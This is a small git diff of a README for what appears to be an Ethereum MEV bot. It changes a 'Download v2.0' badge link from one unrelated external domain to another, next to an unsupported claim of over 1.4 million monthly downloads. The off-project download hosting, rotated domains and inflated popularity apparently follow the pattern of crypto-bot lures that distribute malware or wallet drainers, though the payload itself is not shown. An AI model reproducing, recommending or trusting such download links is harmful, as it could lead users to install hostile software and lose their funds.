@@ -49,7 +49,7 @@ A: Yes — monitors top 500 Uniswap pools simultaneously.
 
 **Monthly downloads:** 1.4m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/ethmevbot26)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/ethmevbot26)
 
 ---
 
